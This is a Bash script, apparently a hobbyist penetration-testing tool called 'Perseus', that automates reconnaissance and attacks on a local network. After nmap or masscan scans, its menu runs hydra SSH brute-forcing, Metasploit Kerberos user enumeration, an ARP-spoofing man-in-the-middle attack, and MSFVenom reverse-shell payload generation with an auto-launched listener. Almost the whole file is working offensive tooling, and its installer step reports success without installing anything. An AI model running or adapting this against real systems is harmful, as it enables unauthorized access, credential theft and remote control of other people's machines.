#!/bin/bash

# Terminal colour variables
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
Orange='\033[0;33m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
Light_Gray='\033[0;37m'
Dark_Gray='\033[1;30m'
Light_Red='\033[1;31m'
Light_Green='\033[1;32m'
Yellow='\033[1;33m'
Light_Blue='\033[1;34m'
Light_Purple='\033[1;35m'
Light_Cyan='\033[1;36m'
White='\033[1;37m'
NC='\033[0m' # No Color

# BASH trap to handle ctrl+c exit
trap 'echo -e "\n${Red}[X]${NC} Ctrl+C Detected. Exiting.\n"; cd $currdir; rm -rf tmp; exit 130' SIGINT

clear

# Setting initial variables
currdir=$(echo $PWD)
logdir="/var/log/perseus_logs"
curr_ip=$(hostname -I | cut -d " " -f 1)
gateway=$(ip r | head -n 1 | cut -d" " -f 3)
subnet=$(echo "$gateway" | cut -d. -f 1-3)
network=$(echo "$subnet.0/24") 
fndate=$(date +%b-%d-%Y_%H%M%S)
date=$(date)


function welcome {
	
# Welcome message
printf "\n Welcome to \n\n"



                                                                                                                                  
                                                                                                                                  
echo -e '\t\tPPPPPPPPPPPPPPPPP                                                                                                                 ' 
echo -e '\t\tP::::::::::::::::P                                                                                                                ' 
echo -e '\t\tP::::::PPPPPP:::::P                                                                                                               ' 
echo -e '\t\tPP:::::P     P:::::P                                                                                                              ' 
echo -e '\t\t  P::::P     P:::::P  eeeeeeeeeeee    rrrrr   rrrrrrrrr       ssssssssss       eeeeeeeeeeee    uuuuuu    uuuuuu      ssssssssss   ' 
echo -e '\t\t  P::::P     P:::::Pee::::::::::::ee  r::::rrr:::::::::r    ss::::::::::s    ee::::::::::::ee  u::::u    u::::u    ss::::::::::s  ' 
echo -e '\t\t  P::::PPPPPP:::::Pe::::::eeeee:::::eer:::::::::::::::::r ss:::::::::::::s  e::::::eeeee:::::eeu::::u    u::::u  ss:::::::::::::s ' 
echo -e '\t\t  P:::::::::::::PPe::::::e     e:::::err::::::rrrrr::::::rs::::::ssss:::::se::::::e     e:::::eu::::u    u::::u  s::::::ssss:::::s' 
echo -e '\t\t  P::::PPPPPPPPP  e:::::::eeeee::::::e r:::::r     r:::::r s:::::s  ssssss e:::::::eeeee::::::eu::::u    u::::u   s:::::s  ssssss ' 
echo -e '\t\t  P::::P          e:::::::::::::::::e  r:::::r     rrrrrrr   s::::::s      e:::::::::::::::::e u::::u    u::::u     s::::::s      ' 
echo -e '\t\t  P::::P          e::::::eeeeeeeeeee   r:::::r                  s::::::s   e::::::eeeeeeeeeee  u::::u    u::::u        s::::::s   ' 
echo -e '\t\t  P::::P          e:::::::e            r:::::r            ssssss   s:::::s e:::::::e           u:::::uuuu:::::u  ssssss   s:::::s ' 
echo -e '\t\tPP::::::PP        e::::::::e           r:::::r            s:::::ssss::::::se::::::::e          u:::::::::::::::uus:::::ssss::::::s' 
echo -e '\t\tP::::::::P         e::::::::eeeeeeee   r:::::r            s::::::::::::::s  e::::::::eeeeeeee   u:::::::::::::::us::::::::::::::s ' 
echo -e '\t\tP::::::::P          ee:::::::::::::e   r:::::r             s:::::::::::ss    ee:::::::::::::e    uu::::::::uu:::u s:::::::::::ss  ' 
echo -e '\t\tPPPPPPPPPP            eeeeeeeeeeeeee   rrrrrrr              sssssssssss        eeeeeeeeeeeeee      uuuuuuuu  uuuu  sssssssssss    ' 
                                                                                                                                  
                                                                                                                                  
echo                                                                    
}                                                                    


function check_folder {
	# Check if folder exists, otherwise make folder for logs
	[ -d "$logdir" ] || mkdir "$logdir"
	}
                                                                  
function make_tmp {
	mkdir "tmp"
	cd "tmp"
	}

function initial_menu {
	#Initial menu to choose how to set target iP - network scan or manual entry
	echo -e "${Green}[+]${NC} The subnet you are in is $network!"
	echo -e "${Green}[+]${NC} Your internal IP address is $curr_ip!"
	echo -e "\n${Orange}[?]${NC} What would you like to do?: "
	PS3="Please select an option: "
	select opt in "Scan network for targets" "Enter target manually" Exit
	do
		case $opt in
			"Scan network for targets") 
				echo -e "\n${Light_Cyan}[+]${NC} You have chosen to $opt"
				echo -e "${Light_Cyan}[+]${NC} Scanning $network"
				network_list
				echo -e "\n${Orange}[?]${NC} Choose target from list?: "
				select ipaddr in "${ips[@]}"
				do
					target="$ipaddr"
					log_init
					break
				done
				break
			;;
			"Enter target manually" )
				echo -e "\n${Light_Cyan}[+]${NC} You have chosen to $opt"
				manual_target
				log_init
				break
			;;
			Exit) 
				echo -e "${Red}[X]${NC} You have selected $opt"
				echo -e "${Red}[X]${NC} Thank you for using Perseus! Bye bye!"
				exit
			;;
			*) 
				echo -e "${Red}[-_-\"]${NC} That isn't a listed option. Try Again!"
			;;
		esac
	done
	}
function network_list {
	# list ip addresses discovered on subnet
	readarray -t netscan < <(nmap -sn $network)
	clear
	echo -e "\nHosts up on $network: \n"
	printf "\t|%20s|\n" "IP Address"
	ips=()
	for element in "${netscan[@]}"; do
		if [[ "$element" =~ "scan report for" && "$element" != *$curr_ip* ]]; then
			ip=$(echo "$element" | awk '{print $5}')
			ips+=($ip)
			printf "\t|${Light_Cyan}%20s${NC}|\n" "$ip"
		fi
	done	
		
	}
function manual_target {
	# For manual entry of target
	echo -e -n "\n${Orange}[?]${NC} Enter target IP: " 
	read target
	}

function choose_scan_type {
	# Choose between Nmap and Masscan
	echo -e "${Orange}[?]${NC} Choose a scan method?: "
	PS3="Please select an option: "
	select opt in  "Mass Scan" "Nmap" Exit
	do
		case $opt in
			"Mass Scan") 
				masscan_scan
				break
			;;
			"Nmap" )
				echo -e "${Light_Cyan}[+]${NC} You have chosen to $opt"
				scantype="nmap -A $target"
				nmap_scan
				break
			;;
			Exit) 
				echo -e "${Red}[X]${NC} You have selected $opt"
				echo -e "${Red}[X]${NC} Thank you for using Perseus! Bye bye!"
				exit
			;;
			*) 
				echo -e "${Red}[-_-\"]${NC} That isn't a listed option. Try Again!"
			;;
		esac
	done
	}

function masscan_scan {
	echo -e "${Light_Green}[+]${NC} You are targetting $target!"
	echo -e "\n${Orange}[?]${NC} Choose first port of port range: "
	read pf
	echo -e "\n${Orange}[?]${NC} Choose last port of port range: "
	read pl
	echo -e "${Light_Green}[+]${NC} Gathering information on $target..."
	readarray -t masscanres < <(masscan $target --port "$pf"-"$pl")
	scantype="masscan $target --port $pf-$pl"
	log_maker
	masscan_res
	masscan_log
	}
	
function masscan_res {
	clear
	declare -a ports
	declare -a protocols
	
	echo -e "\nPorts discovered on $target: \n"
	
	printf "\t|%10s|%10s|\n" "Port" "Protocol"
		for element in "${masscanres[@]}"; do
			if [[ "$element" =~ "open" ]]; then
				port=$(echo $element | cut -d"/" -f 1 | cut -d" " -f 4)
				ports+=("$port")
				protocol=$(echo $element | cut -d"/" -f 2 | cut -d" " -f 1)
				protocols+=("$protocol")
				printf "\t|${Light_Cyan}%10s${NC}|${Light_Red}%10s${NC}|\n" "${port}" "${protocol}"
				fi
		done
		
		if [[ "${#ports[@]}" -eq 0 ]]; then
			echo -e "\n\n${Light_Red}[X]${NC} It looks like your target has NO ports open. Better luck next time!"
			cd $currdir
			rm -rf tmp
			exit
		fi
	
	printf "\n"
	}
	
function masscan_log {
	echo "------------------------------------------------------------------------" >> "$logfile"
	echo -e "\nPorts discovered on $target: \n" >> "$logfile"
	for element in "${masscanres[@]}"; do
			if [[ "$element" =~ "open" ]]; then
				port=$(echo $element | cut -d"/" -f 1 | cut -d" " -f 4)
				protocol=$(echo $element | cut -d"/" -f 2 | cut -d" " -f 1)
				printf "\t|Open port: %10s|Protocol: %10s|\n" "${port}" "${protocol}" >> "$logfile"
			fi
		done
	}

function nmap_scan {
	log_maker
	gather_nmap
	open_ports
	open_ports_log
	os_detect
	sleep 1
	host_script
	host_log
	}

function gather_nmap {

	echo -e "${Light_Green}[+]${NC} You are targetting $target!"
	echo -e "${Light_Green}[+]${NC} Gathering information on $target..."

	readarray -t res < <(nmap -A $target)
}

dependencies=(git curl systemctl geoiplookup nmap masscan )
missing_dependencies=()

function check_root {
	if [ $EUID != 0 ]; then
		echo -e "Please run script as root user\n"
		exit 2	
	fi
	}
 
function check_dependency {
	for dependency in ${dependencies[@]}; do
		$dependency &> /dev/null
		err_code=$(echo $?)
		if [ $err_code -eq 127 ]; then
			echo -e "You don't have $dependency\n"
			missing_dependencies+=($dependency)
		fi
	done 
	}

function check_install {
	if
		[[ "${#missing_dependencies[@]}" -ne 0 ]]; then
			echo -e "\n\n${Light_Red}[!]${NC} It looks like you are missing some programmes!"
			printf "\t|%15s|\n" "Programmes"
			for element in ${missing_dependencies[@]}; do
				printf "\t|${Light_Red}%20s${NC}|\n" "$element"
			done
			echo -e "\n\n${Light_Red}[!]${NC} Shall we install them?"
			PS3="Please select an option: "
			select opt in Yes No
			do
				case $opt in
					Yes)
						echo -e "${Light_Cyan}[+]${NC} You have chosen to install. Installation will begin shortly"
						sleep 1
						install_missing
						break
					;;
					No)
						echo -e "${Red}[X]${NC} You have selected $opt"
						echo -e "${Red}[X]${NC} Thank you for using Perseus! Bye bye!"
						exit
					;;
					*)
						echo -e "${Red}[-_-\"]${NC} That isn't a listed option. Try Again!"
					;;
				esac
			done
	fi
	}
	
function install_missing {
	for element in ${missing_dependencies[@]}; do
		case ${element} in
			git) 
				echo -e "Installing $element\n"
				#apt install git -y
				echo -e "$element installed successfully\n"
				;;
			curl) 
				echo -e "Installing $element\n"
				#apt install curl -y
				echo -e "$element installed successfully\n"
				;;
			tor) 
				echo -e "Installing $element\n"
				#apt install tor -y
				echo -e "$element installed successfully\n"
				;;
			systemctl) 
				echo -e "Installing $element\n"
				#apt install systemd -y
				echo -e "$element installed successfully\n"
				;;
			geoiplookup) 
				echo -e "Installing $element\n"
				#apt install geoip-bin 2> /dev/null 2>&1
				echo -e "$element installed successfully\n"
				;;
			nmap) 
				echo -e "Installing $element\n"
				#apt install nmap -y
				echo -e "$element installed successfully\n"
				;;
			masscan) 
				echo -e "Installing $element\n"
				#apt install masscan -y
				echo -e "$element installed successfully\n"
				;;
		esac
done
	}
	
function open_ports {
clear

declare -a ports
declare -a protocols
declare -a services
declare -a versions

echo -e "\nOpen Ports on $target: \n"

printf "\t|%10s|%10s|%10s\t|%10s\n" "Port" "Protocol" "Service" "Version"
	for element in "${res[@]}"; do
		if [[ "$element" =~ "open" && "$element" != *OSScan* ]]; then
			port=$(echo $element | cut -d"/" -f 1)
			ports+=("$port")
			protocol=$(echo $element | cut -d"/" -f 2 | awk '{print $1}')
			protocols+=("$protocol")
			service=$(echo $element | cut -d"/" -f 2 | awk '{print $3}')
			services+=("$service")
			version=$(echo $element | cut -d"/" -f 2 | awk '{for(i=4;i<=NF;++i) printf "%s ", $i; print ""}')
			versions+=("$version")
			printf "\t|${Light_Cyan}%10s${NC}|${Light_Purple}%10s${NC}|${Light_Green}%10s${NC}\t|${Light_Red}%10s${NC}\n" "${port}" "${protocol}" "${service}" "${version}"
		fi
	done
	if [[ "${#ports[@]}" -eq 0 ]]; then
		echo -e "\n\n${Light_Red}[X]${NC} It looks like your target has NO ports open. Better luck next time!"
		cd $currdir
		rm -rf tmp
		exit
	fi
printf "\n"
}

function open_ports_log {

	for element in "${res[@]}"; do
		if [[ "$element" =~ "open" && "$element" != *OSScan* ]]; then
			port=$(echo $element | cut -d"/" -f 1)
			protocol=$(echo $element | cut -d"/" -f 2 | awk '{print $1}')
			service=$(echo $element | cut -d"/" -f 2 | awk '{print $3}')
			version=$(echo $element | cut -d"/" -f 2 | awk '{for(i=4;i<=NF;++i) printf "%s ", $i; print ""}')
			printf "\tOpen port: %10s| Protocol: %10s| Service: %20s| Version: %10s\n" "${port}" "${protocol}" "${service}" "${version}" >> "$logfile"
		fi
	done
}

function os_detect {
echo -e "\tOperating System of target detected as: "
echo -e "Operating System Detection: " >> "$logfile"
echo -e "\tOperating System of target detected as: " >> "$logfile"
	for element in "${res[@]}"; do
		if [[ "$element" =~ "OS details" || "$element" =~ "Running" ]]; then
			#os=$(echo $element | cut -d":" -f 2)
			#echo -e "\t$os"
			case $element in 
				*Windows*) 
					echo -e "\t${Green}[+] ${Light_Cyan}$element${NC}\n"
					echo -e "\t$element detected!\n" >> "$logfile"
					os="windows"
					;;
				*OSX*) 
					echo -e "\t${Green}[+] ${Light_Cyan}$element${NC}\n"
					echo -e "\t$element detected!\n" >> "$logfile"
					os="osx"
					;;
				*) 
					echo -e "\t${Green}[+] ${Light_Cyan}$element${NC}\n"
					echo -e "\t$element detected!\n" >> "$logfile"
					os="linux"
					;;
			esac
		fi
	done
	}

function host_script {
	echo -e "Host Details Detection: "
	for element in "${res[@]}"; do
		if [[ "$element" =~ "Computer name" ]]; then
			com_name=$(echo "$element" | cut -d: -f 2 | awk '{print $1}')
			echo -e "[+] Computer Name: ${Light_Cyan}$com_name${NC} "
			
		#~ else
			#~ echo -e "${Red}[X]${NC} No Computer Name detected!"
		fi
		if [[ "$element" =~ "Domain name" ]]; then
			dom_name=$(echo "$element" | cut -d: -f 2 | awk '{print $1}')
			echo -e "[+] Domain Name: ${Light_Cyan}$dom_name${NC} "
			
			
		#~ else
			#~ echo -e "${Red}[X]${NC} No Domain Name detected!"
		fi
		if [[ "$element" =~ "FQDN" ]]; then
			fqdn=$(echo "$element" | cut -d: -f 2 | awk '{print $1}')
			echo -e "[+] FQDN: ${Light_Cyan}$fqdn${NC} "
			
		#~ else
			#~ echo -e "${Red}[X]${NC} No FQDN detected!"
		fi
	done
	}

function host_log {
	echo -e "Host Details Detection: " >> "$logfile"
	echo -e "\tComputer Name: $com_name " >> "$logfile"
	echo -e "\tDomain Name: $dom_name " >> "$logfile"
	echo -e "\tFQDN: $fqdn " >> "$logfile"
	echo -e "\n" >> "$logfile"
	}

function next_steps {
	echo -e "\n\n${Orange}[?]${NC} What next?"
	
	PS3="Please select an option: "
	select opt in "Brute Force SSH" "Kerberos Enumusers" "Man-in-the-Middle Attack" "Create MSFVenom Payload" Exit
	do
		case $opt in
			"Brute Force SSH")
				echo -e "${Light_Cyan}[+]${NC} You have selected $opt"
				if [[ $scantype == "nmap -A $target" ]]; then
					open_ports
				else
					masscan_res
				fi
				attack="$opt"
				log_attack
				brute_force
				hydra_res
				break
			;;
			
			"Kerberos Enumusers")
				echo -e "${Light_Cyan}[+]${NC} You have selected $opt"
				attack="$opt"
				clear
				if [[ $scantype == "nmap -A $target" ]]; then
					open_ports
				else
					masscan_res
				fi
				host_script
				krbs_detect
				echo -e -n "${Orange}[?]${NC} Enter target Domain Name: "
				read dom_name
				echo -e "${Orange}[?]${NC} Enter path to list of users: "
				read fn
				krbs_enum
				log_attack
				spool_log
				break
			;;
			
			"Man-in-the-Middle Attack")
				attack="MitM - Arp Spoof"
				echo -e "${Light_Cyan}[+]${NC} You have selected $opt"
				echo -e "${Light_Cyan}[+]${NC} Press Ctrl+C to end attack."
				attack="$opt"
				log_attack
				mitm_attack
				break
			;;
			
			"Create MSFVenom Payload")
				clear
				attack="MSF Venom Payload"
				if [[ $scantype == "nmap -A $target" ]]; then
					open_ports
				else
					masscan_res
				fi
				os_detect
				attack="$opt"
				log_attack
				payload_gen
				log_attack
				break
			;;
			Exit) 
				echo -e "${Red}[X]${NC} You have selected $opt"
				echo -e "${Red}[X]${NC} Thank you for using Perseus! Bye bye!"
				exit
			;;
			*) 
				echo -e "${Red}[-_-\"]${NC} That isn't a listed option. Try Again!"
				next_steps
			;;
		esac
	done 
	}

function brute_force {
	echo -e "${Orange}[?]${NC} Do you wish to provide a password list, a single password, crunch a new list, or exit"
	PS3="Choose 1, 2, 3, or 4: "
	select pass in "Password List" "Single Password" Crunch Exit
	do
		case "$pass" in
			"Password List")
				echo -e "${Light_Cyan}[+]${NC} You selected $pass"
				echo -e "${Orange}[?]${NC} Enter filename or path to file"
				read fn
				cat $fn > pass.lst
				break
				;;
			"Single Password")
				echo -e "${Light_Cyan}[+]${NC} You selected $pass"
				echo -e -n "${Orange}[?]${NC} Enter password you wish to try: "
				read password
				echo $password > pass.lst
				break
				;;
			Crunch)
				echo -e "${Light_Cyan}[+]${NC} You selected $pass"
				read -p "${Light_Cyan}[+]${NC} Enter a minimum number: " min
				read -p "${Light_Cyan}[+]${NC} Enter a maximum number: " max
				read -p "${Light_Cyan}[+]${NC} Enter a string of desired characters: " charlist
				crunch $min $max $charlist > pass.lst					
				break
				;;	
			Exit)
				echo -e "${Red}[X]${NC} You selected $pass. Goodbye!"
				exit
				;;
			* )
				echo -e "${Light_Red}[!]${NC} That is not a valid choice, Try again"
		esac
	break
	done

	PS3="Choose 1, 2, or 3: "
	select usrnme in "Username List" "Enter Manually" Exit
	do
		case "$usrnme" in
			"Username List")
				echo -e "${Light_Cyan}[+]${NC} You have selected $usrnme"
				echo -e -n "${Light_Cyan}[+]${NC} Enter filename or path to file: " 
				read usrfile
				cat $usrfile > usernames.lst
				readarray -t hydrares < <(hydra $target -L usernames.lst -P pass.lst ssh)
				rm usernames.lst
				break
				;;
			"Enter Manually")
				echo -e "${Light_Cyan}[+]${NC} You have selected $usrnme"
				echo -e -n "${Light_Cyan}[+]${NC} Enter username to try: " 
				read usrname
				readarray -t hydrares < <(hydra $target -l $usrname -P pass.lst ssh)
				break
				;;
			Exit)
				echo -e "${Red}[X]${NC} You selected $usrnme. Goodbye!"
				exit
				;;
			*)
				echo -e "${Light_Red}[!]${NC} That is not a valid choice, Try again"
		esac
	done
	}
	
function hydra_res {
	echo -e "\nSuccessful SSH credentials for $target: \n"
	echo -e "\nSuccessful SSH credentials for $target: \n" >> "$logfile"
	printf "\t|%20s|%20s|%20s|\n" "Port" "Login" "Password"
	printf "\t|%20s|%20s|%20s|\n" "Port" "Login" "Password" >> "$logfile"
		for element in "${hydrares[@]}"; do
			if [[ "$element" =~ "host" && "$element" =~ "password" ]]; then
				readarray -t ports < <(echo $element | cut -d" " -f 1)
				readarray -t logins < <(echo $element | awk '{print $5}')
				readarray -t passwords < <(echo $element | awk '{print $7}')
				printf "\t|${Light_Cyan}%20s${NC}|${Light_Red}%20s${NC}|${Light_Green}%20s${NC}|\n" "${ports[@]}" "${logins[@]}" "${passwords[@]}"
				printf "\t|%20s|%20s|%20s|\n" "${ports[@]}" "${logins[@]}" "${passwords[@]}" >> "$logfile"
			fi
		done
		if [[ "${#ports[@]}" -eq 0 ]]; then
			echo -e "\n\n${Light_Red}[X]${NC} It looks like none of the credentials supplied worked. Better luck next time!" 
			echo -e "\n\n$[X] It looks like none of the credentials supplied worked. Better luck next time!" >> "$logfile"
			cd $currdir
			rm -rf tmp
			exit
		fi
	echo "------------------------------------------------------------------------" >> "$logfile"
	printf "\n"
	}

function choose_os {
	echo -e "${Orange}[?]${NC} Choose operating system of victim: "
	PS3="Victim OS: "
	select os in Windows OSX Linux Exit; do
		case $os in
			Windows) 
				echo -e "${Green}[+]${NC} You have chosen $os!"
				stage="$(echo "$os" | tr '[:upper:]' '[:lower:]')/"
				ftype="exe"
				break
				;;
			OSX | Linux) 
				echo -e "${Green}[+]${NC} You have chosen $os!"
				stage="$(echo "$os" | tr '[:upper:]' '[:lower:]')/x64/"
				if [[ "$os" = "OSX" ]]; then
					ftype="macho"
				else
					ftype="elf"
				fi
				break
				;;
			Exit) 
				echo -e "${Red}[X]${NC} Exiting... thank you and have a nice day"
				exit
				;;
			*) 
				echo -e "${Red}[-_-\"]${NC} Well, that ain't right! Try again!"
				;;
		esac
	done
	echo "stage: $stage" >> "$logfile"
	}

function construct_stager {
	echo -e "${Green}[+]${NC} You have chosen $stager!"
	stager="$(echo "$stager" | tr '[:upper:]' '[:lower:]'| sed 's. ._.')"
	}

function choose_stager {
	echo -e "${Orange}[?]${NC} Choose your stager: "
	PS3="Stager: "
	select stager in "Reverse TCP" "Bind TCP" "Reverse HTTP" "Reverse HTTPS" Exit; do
		case $stager in
			"Reverse TCP" | "Bind TCP") 
				construct_stager
				stager=$"meterpreter/$stager"
				break
				;;
			"Reverse HTTP" | "Reverse HTTPS")
				construct_stager
				stager="meterpreter_$stager"
				break
				;;
			Exit) 
				echo -e "${Red}[X]${NC} Exiting... thank you and have a nice day"
				exit
				;;
			*) 
				echo -e "${Red}[-_-\"]${NC} Well, that ain't right! Try again!"
				;;
		esac
	done
	echo "stager: $stager" >> "$logfile"
	}

function name_file {
	read -p "Please name your payload: " name
	read -p "Please select a port: " lport
	if [[ -f "$name$lport.$ftype" ]]; then
		echo "Payload name taken! Try again"
		name_file
	fi
	echo "payload: $name$lport.$ftype" >> "$logfile"
	}

function make_payload {
	if [[ -d  "../payloads" ]]; then
		echo "payloads directory exists... changing directory now."
		cd "../payloads"
	else
		mkdir "../payloads"
		echo "payloads directory created... changing directory now."
		cd "../payloads"
	fi
	
	curr_ip=$(hostname -I | cut -d " " -f 1)
	
	"$1"
	
	if [[ "$stager" = "bind_tcp" ]]; then
		msfvenom -p "$stage$stager" lport="$lport" -f "$ftype" -o "$name$lport.$ftype"
	else
		msfvenom -p "$stage$stager" lhost="$curr_ip" lport="$lport" -f "$ftype" -o "$name$lport.$ftype"
	fi
	echo "lport: $lport" >> "$logfile"
	echo "lhost: $curr_ip" >> "$logfile"
	}

function create_rc_file {
	echo "use exploit/multi/handler" > listen"_$os$name$lport".rc
	echo "set payload $stage$stager" >> listen"_$os$name$lport".rc
	echo "set lhost $curr_ip" >> listen"_$os$name$lport".rc
	echo "set lport $lport" >> listen"_$os$name$lport".rc
	echo "exploit" >> listen"_$os$name$lport".rc
	}

function countdown {
	i=5
	while [ $i -ge 0 ] ;do
         echo -e "\t${Green}[$i]${NC}"
         i=$(( "$i"-1 ))
         sleep 1s
	done
	}

function payload_gen {
echo -e "${Green}[+]${NC} You have chosen to generate a payload with MSFVenom"
echo

choose_os

choose_stager

make_payload name_file

echo -e "${Green}[+]${NC} Payload $name$lport.$ftype Created in $PWD"
echo -e "Payload $name$lport.$ftype Created in $PWD" >> "$logfile"
create_rc_file
echo -e "${Green}[+]${NC} listen_$os$name$lport.rc file created"

echo -e "${Green}[+]${NC} msfconsole opening in T-5 seconds: "

countdown; msfconsole -r listen"_$os$name$lport".rc
	}

function krbs_enum {
	echo "spool ./$filename.spool" > "krbs_conf".rc
	echo "use auxiliary/gather/kerberos_enumusers" >> "krbs_conf".rc
	echo "set domain $dom_name" >> "krbs_conf".rc
	echo "set rhosts $target" >> "krbs_conf".rc
	echo "set rport $rport" >> "krbs_conf".rc
	echo "set user_file $fn" >> "krbs_conf".rc
	echo "exploit" >> "krbs_conf".rc
	echo "exit" >> "krbs_conf".rc
	echo "msfconsole opening in T-5 seconds: "
	countdown
	msfconsole -r "krbs_conf".rc
	}
	
function krbs_detect {
kerbs=()
	for element in "${res[@]}"; do
		if [[ "$element" =~ "kerberos" ]]; then
			port=$(echo "$element" | cut -d"/" -f 1)
			kerbs+="$element"
		fi
	done
	if [[ "${#kerbs[@]}" -eq 0 ]]; then
		echo -e "${Light_Red}[!]${NC} Kerberos service not detected"
		echo -e "${Orange}[?]${NC} Enter port to target: "
		read rport
		echo -e "${Light_Green}[+]${NC} Port ${Green}$rport${NC} selected!"
	else
		echo -e "${Light_Green}[!]${NC} Kerberos service detected on Port ${Green}$port${NC}"
		echo -e "${Orange}[?]${NC} Do you wish to use this port: "
		PS3="Yes or No? "
		select opt in Yes No
		do
			case $opt in
				Yes)
					echo -e "${Light_Green}[+]${NC} Port ${Green}$port${NC} selected!"
					rport=$port
					break
					;;
				No)
					echo -e "${Orange}[?]${NC} Enter port to target: "
					read rport
					echo -e "${Light_Green}[+]${NC} Port ${Green}$rport${NC} selected!"
					break
					;;
				*)echo -e "${Light_Red}[!]${NC} That is not a valid choice, Try again"
			esac
		done
	fi
	}

function mitm_attack {
	cp ~/PycharmProjects/arp_spoof/arp_spoof3.py ./arp_spoof3.py
	echo "1" > /proc/sys/net/ipv4/ip_forward 
	python3 arp_spoof3.py -t $target -g $gateway
	}

function log_init {
	filename="$fndate-$target.log"
	logfile="$logdir/$filename"
	echo "" > "$logfile"
	echo "Log for $target on $date"  >> "$logfile"
	}

function log_maker {
	echo "------------------------------------------------------------------------" >> "$logfile"
	echo "Network - $network" >> "$logfile"
	echo "Target IP - $target" >> "$logfile"
	echo "Scan Perfomed - $scantype" >> "$logfile"
	echo "------------------------------------------------------------------------" >> "$logfile"
	echo "Scan results: " >> "$logfile"
	}
function log_attack {
	echo "------------------------------------------------------------------------" >> "$logfile"
	echo "Attack vector: " >> "$logfile"
	echo "$attack was chosen." >> "$logfile"
	}
	
function spool_log {
	
	readarray -t spool < "$filename.spool"
	echo -e "\nEnumerated Users on $target: \n" >> "$logfile"
	printf "\t|%20s|\n" "Present Users" >> "$logfile"
	
	for element in "${spool[@]}"; do
		if [[ "$element" =~ "is present" ]]; then
			readarray -t users < <(echo $element | cut -d'"' -f 2 | cut -d'"' -f 1)
			printf "\t|%20s|\n" "${users[@]}" >> "$logfile"
		fi
	done
	if [[ "${#users[@]}" -eq 0 ]]; then

		echo -e "No valid users detected on target." >> "$logfile"
		exit
	fi
	echo "------------------------------------------------------------------------" >> "$logfile"
	}

check_root
check_folder
welcome
make_tmp
check_dependency
check_install
initial_menu
choose_scan_type
next_steps


cd $currdir
rm -rf tmp
